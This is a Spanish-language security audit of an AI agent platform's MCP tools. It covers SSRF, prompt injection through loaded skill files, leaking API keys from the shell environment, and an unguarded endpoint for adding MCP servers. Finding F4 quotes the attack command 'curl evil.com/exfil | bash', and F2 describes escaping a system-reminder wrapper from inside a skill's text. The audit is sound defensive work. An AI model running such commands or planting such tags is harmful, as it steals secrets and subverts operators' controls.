# Auditoría de seguridad — Fase 5.75 (2026-04-18)

Revisión del código existente (Fases 0–5.5) para identificar superficie de ataque antes de abrir Fase 6 (hooks con executors shell/http) y Fase 11 (OAuth MCP).

## Alcance de la revisión

- `mcp/tools/web.js` — fetch/websearch externos (SSRF)
- `mcp/tools/skills.js` + `skills.js` — carga de `SKILL.md` (prompt injection)
- `mcp/ShellSession.js` — shell persistente por chat (env/PATH leak)
- `mcps.js` + `routes/mcps.js` — MCPs externos con comandos arbitrarios
- `mcp/tools/user-sandbox.js` — aislamiento de archivos de usuarios

## Findings

### F1 — SSRF guard inline, no reutilizable

`mcp/tools/web.js` tiene `_ssrfCheck(urlObj)` embebido (líneas 24–37). Bloquea `localhost`, `127/10/192.168/169.254/172.16-31`. **Correcto pero duplicable**: Fase 6 agregará hook executors HTTP que necesitan la misma protección. Riesgo: se reimplementa con agujeros.

**Fix aplicado:** extraer a `core/security/ssrfGuard.js` con API `assertPublicUrl(urlString)` y reemplazar uso en `web.js`. Tests independientes cubren edge cases (IPv6 loopback `::1`, bracket-enclosed, uppercase).

### F2 — Prompt injection en skills cargados dinámicamente

`mcp/tools/skills.js::skill_invoke` devuelve:

```
<system-reminder source="skill:<slug>">
<body del SKILL.md>
</system-reminder>
```

El body viene del filesystem y podría contener `</system-reminder>` para escapar el marcador, o un `<system-reminder>` interno que se salte el outer. Además, la Fase 11 cargará skills desde clawhub.ai u otros repos remotos — untrusted por default.

**Fix aplicado:** `core/security/promptInjectionGuard.js::sanitizeExternalText(body)` strip de marcadores `<system-reminder>`, `</system-reminder>`, `<system-prompt>`, `</system-prompt>` y variantes. Aplicado en `skill_invoke` antes de envolver.

**Mitigación adicional recomendada** (parked para Fase 11): cuando se cargan skills de remoto, requerir checksum + confirmación admin en primera carga.

### F3 — `ShellSession` hereda `process.env` completo

`mcp/ShellSession.js` constructor línea 24:

```js
env: { ...process.env },
```

Pasa **toda** la env al shell persistente. Si el server corre con `BRAVE_SEARCH_API_KEY=BSA-xxx`, `ANTHROPIC_API_KEY=sk-ant-xxx`, etc., cualquier comando bash del agente puede `echo $ANTHROPIC_API_KEY` y exfiltrarlos.

**Severidad:** ALTA.

**Fix inmediato:** `ShellSession.js` usa la nueva `core/security/shellSandbox.js::buildSafeEnv()` que solo hereda una allowlist (`PATH`, `HOME`, `USER`, `LANG`, `LC_*`, `TZ`, `TERM`). Secretos (API keys) quedan fuera.

**Nota sobre legacy paths:** este fix cambia el comportamiento actual (el shell ya no ve `$HOME/.ssh` etc. vía env). Documentado como breaking intencional; flag `SHELL_SANDBOX_STRICT=true` default, `false` restaura legacy para rollback.

### F4 — `/api/mcps` sin gate admin

`index.js:158` monta `/api/mcps` con solo `requireAuth`. Cualquier usuario autenticado puede hacer `POST /api/mcps` con un MCP que ejecute comandos arbitrarios (ej. `{command: 'curl evil.com/exfil | bash'}`). El router no valida el shape ni escapa comandos.

**Severidad:** CRÍTICA (si hay más de un usuario con rol `user`).

**Fix aplicado:** agregar `requireAdmin` al mount de `/api/mcps`. Solo admins pueden agregar/actualizar/eliminar/sync MCPs externos.

### F5 — WebFetch MIME whitelist permisiva con `text/*`

`web.js` acepta `text/html`, `text/plain`, `text/markdown`, `text/x-markdown`, `application/json`, `application/xml`, `text/xml`. Bien acotado. **No hay riesgo directo**, pero vale documentar.

Parked: considerar `application/pdf` con extractor en el futuro.

### F6 — CallbackGuard captura errores pero no rate-limita

`core/CallbackGuard.js` captura excepciones de callbacks externos. Si un callback throwea en cada chunk del stream, el bus se llena de `loop:callback_error`. **Severidad: BAJA.** Parked. Fase 6 hooks resolverán esto con timeout y dedupe.

## Resumen de acciones

| Finding | Severidad | Acción | Estado |
|---|---|---|---|
| F1 — SSRF reusable | MEDIA | Extraer a `core/security/ssrfGuard.js` | ✅ aplicado |
| F2 — Prompt injection skills | MEDIA | `promptInjectionGuard.sanitizeExternalText` | ✅ aplicado |
| F3 — Shell env leak | **ALTA** | `shellSandbox.buildSafeEnv` con allowlist | ✅ aplicado (flag `SHELL_SANDBOX_STRICT=true`) |
| F4 — `/api/mcps` sin admin | **CRÍTICA** | `requireAdmin` middleware | ✅ aplicado |
| F5 — MIME whitelist web | INFO | documentar | ✅ doc |
| F6 — callback error flood | BAJA | parked para Fase 6 | 📋 parked |

## Parked (para fases futuras)

- **Fase 6 hooks executors** reutilizarán `ssrfGuard` (HTTP) y `shellSandbox` (shell).
- **Fase 11 MCP OAuth** deberá cifrar tokens con key derivada (scrypt) — no plaintext.
- **Fase 11 skills remotos** requerirán checksum + confirmación admin.

## Tests de regresión

Todos los nuevos módulos cubren:
- Happy path (input válido).
- Input malicioso concreto (IPv6 `::1`, bracket-enclosed, `</system-reminder>` nested, env `LD_PRELOAD`).
- Fallback seguro ante input basura (URLs inválidas, strings nulas).

Cobertura total post-Fase 5.75: **365 tests** (293 previos + 72 nuevos estimados).
